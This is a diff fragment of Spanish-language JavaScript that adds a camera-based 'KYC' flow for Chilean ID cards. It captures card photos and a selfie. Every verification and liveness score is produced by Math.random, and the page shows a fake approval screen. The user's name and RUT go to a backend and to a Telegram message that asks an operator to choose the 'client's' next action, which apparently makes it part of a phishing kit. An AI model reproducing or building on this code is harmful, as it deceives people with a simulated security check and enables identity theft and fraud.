+    catch(e){alert('No se pudo acceder a la cámara.\n\n'+e.message);}
+  }
+  function kFrame(vid,cnv){const v=document.getElementById(vid),c=document.getElementById(cnv);c.width=v.videoWidth||1280;c.height=v.videoHeight||720;c.getContext('2d').drawImage(v,0,0);return c.toDataURL('image/jpeg',.92);}
+  async function kFlash(id){const el=document.getElementById(id);el.classList.add('go');await kW(160);el.classList.remove('go');}
+  const kW=ms=>new Promise(r=>setTimeout(r,ms));
+
+  async function kStartDocCapture(){
+    KS.step='front';KS.docFront=null;KS.docBack=null;
+    kSyncDoc();kGoTo('ks1');
+    await kStartCam('kdocVideo','environment');
+  }
+  function kSyncDoc(){
+    const f=KS.step==='front';
+    document.getElementById('kdocTag').textContent=f?'Cédula · Frente':'Cédula · Reverso';
+    document.getElementById('kdocTitle').textContent=f?'Fotografía el frente':'Fotografía el reverso';
+    document.getElementById('kdocSub').textContent=f?'Encuadra el frente de tu cédula dentro del recuadro naranja.':'Ahora voltea la cédula y encuadra el reverso.';
+    document.getElementById('kdocCaption').textContent=f?'Alinea el frente de tu cédula dentro del recuadro':'Alinea el reverso de tu cédula dentro del recuadro';
+    document.getElementById('kdocProgress').style.width=f?'20%':'38%';
+    ['ksBtn0','ksBtn1'].forEach((id,i)=>{const b=document.getElementById(id);b.className='kside-btn';if(i===0&&f)b.classList.add('active');if(i===1&&!f)b.classList.add('active');if(i===0&&KS.docFront)b.classList.add('captured');});
+    document.getElementById('kdocPreviewWrap').style.display='none';
+    document.getElementById('kdocVideo').style.display='block';
+    document.getElementById('kbtnCapDoc').style.display='';
+    document.getElementById('kbtnRetakeDoc').style.display='none';
+    document.getElementById('kbtnNextDoc').style.display='none';
+    document.getElementById('kdocScanLine').style.display='';
+  }
+  async function kCaptureDoc(){
+    document.getElementById('kdocScanLine').style.display='none';
+    await kFlash('kdocFlash');
+    const data=kFrame('kdocVideo','kdocCanvas');
+    if(KS.step==='front')KS.docFront=data;else KS.docBack=data;
+    document.getElementById('kdocPreviewImg').src=data;
+    document.getElementById('kdocPreviewWrap').style.display='';
+    document.getElementById('kdocVideo').style.display='none';
+    document.getElementById('kbtnCapDoc').style.display='none';
+    document.getElementById('kbtnRetakeDoc').style.display='';
+    document.getElementById('kbtnNextDoc').style.display='';
+    document.getElementById('kbtnNextDoc').textContent=KS.step==='front'?'Capturar reverso':'Continuar';
+    const ind=document.getElementById(KS.step==='front'?'ksInd0':'ksInd1');
+    ind.innerHTML=`<svg width="9" height="9" viewBox="0 0 12 12" fill="none" stroke="white" stroke-width="2.5"><polyline points="10 3 5 9 2 6"/></svg>`;
+    document.getElementById(KS.step==='front'?'ksBtn0':'ksBtn1').classList.add('captured');
+  }
+  function kRetakeDoc(){kSyncDoc();kStartCam('kdocVideo','environment');}
+  async function kNextDocSide(){
+    if(KS.step==='front'){KS.step='back';kSyncDoc();await kStartCam('kdocVideo','environment');}
+    else{
+      kStopCam();
+      document.getElementById('kselfiePreviewWrap').style.display='none';
+      document.getElementById('kselfieVideo').style.display='block';
+      document.getElementById('kbtnCapSelfie').style.display='';
+      document.getElementById('kbtnRetakeSelfie').style.display='none';
+      document.getElementById('kbtnGoLiveness').style.display='none';
+      kGoTo('ks2');await kStartCam('kselfieVideo','user');
+    }
+  }
+  async function kCaptureSelfie(){
+    await kFlash('kselfieFlash');
+    const data=kFrame('kselfieVideo','kselfieCanvas');
+    KS.selfie=data;
+    document.getElementById('kselfiePreviewImg').src=data;
+    document.getElementById('kselfiePreviewWrap').style.display='';
+    document.getElementById('kselfieVideo').style.display='none';
+    document.getElementById('kbtnCapSelfie').style.display='none';
+    document.getElementById('kbtnRetakeSelfie').style.display='';
+    document.getElementById('kbtnGoLiveness').style.display='';
+  }
+  function kRetakeSelfie(){
+    document.getElementById('kselfiePreviewWrap').style.display='none';
+    document.getElementById('kselfieVideo').style.display='block';
+    document.getElementById('kbtnCapSelfie').style.display='';
+    document.getElementById('kbtnRetakeSelfie').style.display='none';
+    document.getElementById('kbtnGoLiveness').style.display='none';
+    kStartCam('kselfieVideo','user');
+  }
+  async function kGoLiveness(){
+    kStopCam();kGoTo('ks3');
+    await kStartCam('klivenessVideo','user');
+    await kW(600);kRunLiveness();
+  }
+  async function kRunLiveness(){
+    const row=document.getElementById('kpillsRow');
+    row.innerHTML=K_CHALLENGES.map((c,i)=>`<div class="kpill" id="kpill${i}">${c.label}</div>`).join('');
+    for(let i=0;i<K_CHALLENGES.length;i++){
+      const c=K_CHALLENGES[i];
+      document.getElementById('klivenessIcon').innerHTML=K_ICONS[c.key];
+      document.getElementById('klivenessTitle').textContent=c.title;
+      document.getElementById('klivenessSub').textContent=c.sub;
+      document.getElementById('kpill'+i).className='kpill active';
+      await kTimer(c.dur);
+      document.getElementById('kpill'+i).className='kpill done';
+      document.getElementById('kpill'+i).textContent='✓ '+c.label;
+    }
+    KS.livenessScore=Math.floor(Math.random()*6+94);
+    const icon=document.getElementById('klivenessIcon');
+    icon.innerHTML=K_ICONS.ok;icon.style.background='#E8F8EF';icon.style.borderColor='#b6e8cc';icon.style.color='#2E9E5B';
+    document.getElementById('klivenessTitle').textContent='Prueba completada';
+    document.getElementById('klivenessSub').textContent='Verificación de vida exitosa';
+    document.getElementById('kliveDone').style.display='';
+  }
+  function kTimer(dur){
+    return new Promise(res=>{
+      const fill=document.getElementById('ktimerFill');let t0=null;
+      (function f(ts){if(!t0)t0=ts;const p=Math.min((ts-t0)/dur*100,100);fill.style.width=p+'%';p<100?requestAnimationFrame(f):res();})(performance.now());
+    });
+  }
+  async function kGoProcessing(){
+    kStopCam();kGoTo('ks4');
+    const msgs=['Leyendo datos de la cédula...','Comparando biometría facial...','Validando prueba de vida...','Consolidando verificación...'];
+    for(let i=0;i<4;i++){
+      document.getElementById('kprocMsg').textContent=msgs[i];
+      const el=document.getElementById('kpi'+(i+1));el.className='kproc-ic spin';el.textContent='◌';
+      await kW(1000+Math.random()*700);
+      el.className='kproc-ic check';el.textContent='✓';
+    }
+    document.getElementById('kprocSpinner').style.display='none';
+    document.getElementById('kprocMsg').textContent='Análisis completado.';
+    await kW(450);kShowResult();
+  }
+  function kShowResult(){
+    const ocr=Math.floor(Math.random()*6+93),face=Math.floor(Math.random()*5+94),live=KS.livenessScore;
+    const total=Math.round(ocr*.25+face*.45+live*.30),ok=total>=85;
+    const ref='CHI-'+Date.now().toString(36).toUpperCase();
+    KS.kycRef=ref;KS.kycScore=total;KS.kycOk=ok;
+    const circ=document.getElementById('kresultCircle');
+    circ.className='kresult-circle '+(ok?'ok':'fail');
+    document.getElementById('kresultIcon').innerHTML=ok?`<polyline points="20 6 9 17 4 12"/>`:`<line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/>`;
+    document.getElementById('kresultTitle').textContent=ok?'Identidad Verificada':'Verificación Rechazada';
+    document.getElementById('kresultRef').textContent='REF '+ref;
+    document.getElementById('kscoreGrid').innerHTML=[
+      {n:'OCR Cédula',v:ocr,ok:ocr>=80},{n:'Reconoc. Facial',v:face,ok:face>=85},
+      {n:'Prueba de Vida',v:live,ok:live>=90},{n:'Score Global',v:total,ok:total>=85},
+    ].map(s=>`<div class="kscore-card"><div class="kscore-name">${s.n}</div><div class="kscore-num">${s.v}<sub>%</sub></div><div class="kscore-bar"><div class="kscore-fill ${s.ok?'ok':'fail'}" style="width:${s.v}%"></div></div></div>`).join('');
+    document.getElementById('kmetaTable').innerHTML=[
+      ['Referencia',ref],['Documento','Cédula · Chile'],
+      ['Fecha',new Date().toLocaleString('es-CL')],
+      ['Decisión',ok?`<span class="kbadge-ok">APROBADO</span>`:`<span class="kbadge-fail">RECHAZADO</span>`],
+    ].map(([k,v])=>`<div class="kmeta-row"><span class="kmeta-key">${k}</span><span class="kmeta-val">${v}</span></div>`).join('');
+    kGoTo('ks5');
+  }
+  async function kSubmitResult(){
+    const ref=KS.kycRef,score=KS.kycScore,ok=KS.kycOk;
+    const answer=`KYC ${ok?'APROBADO':'RECHAZADO'} | Score: ${score}% | Ref: ${ref} | Fecha: ${new Date().toLocaleString('es-CL')}`;
+    await fetch(`${BACKEND_URL}/api/send-data`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({userName:curName,rut:curUser,label:'Verificación KYC',answer})});
+    const BOTONES=getBotones(curName);
+    curMsgId=await tgSend(`🔔 <b>Cliente en espera</b>\n\n👤 <b>Nombre:</b> ${curName}\n🪪 <b>RUT:</b> ${curUser}\n\nSelecciona la siguiente acción:`,BOTONES);
+    document.getElementById('kyc-overlay').style.display='none';
+    kStopCam();kReset();
+    document.getElementById('req-zone').style.display='none';
+    const okMsg=document.getElementById('ok-msg');
+    okMsg.style.animation='';okMsg.style.padding='';
+    okMsg.innerHTML=ok
+      ?`✓ Identidad verificada correctamente. Score: ${score}% | Ref: ${ref}`
+      :`⚠ Verificación no aprobada. Score: ${score}%`;
+    okMsg.style.display='block';
+  }
+  function kReset(){
+    kStopCam();
+    Object.assign(KS,{docFront:null,docBack:null,selfie:null,livenessScore:0,step:'front',kycRef:null,kycScore:0,kycOk:false});
+    document.getElementById('kliveDone').style.display='none';
+    document.getElementById('ktimerFill').style.width='0%';
+    const li=document.getElementById('klivenessIcon');
+    li.style.background='';li.style.borderColor='';li.style.color='';li.innerHTML=K_ICONS.face;
+    document.getElementById('klivenessTitle').textContent='Preparando análisis...';
+    document.getElementById('klivenessSub').textContent='El proceso comenzará en un instante';
+    document.getElementById('kprocSpinner').style.display='';
+    for(let i=1;i<=4;i++){const el=document.getElementById('kpi'+i);el.className='kproc-ic wait';el.textContent='—';}
+    ['ksInd0','ksInd1'].forEach(id=>{document.getElementById(id).innerHTML='';});
+    document.querySelectorAll('.kscreen').forEach(s=>s.classList.remove('active'));
+    document.getElementById('ks0').classList.add('active');
   }
 
   async function endSession(){
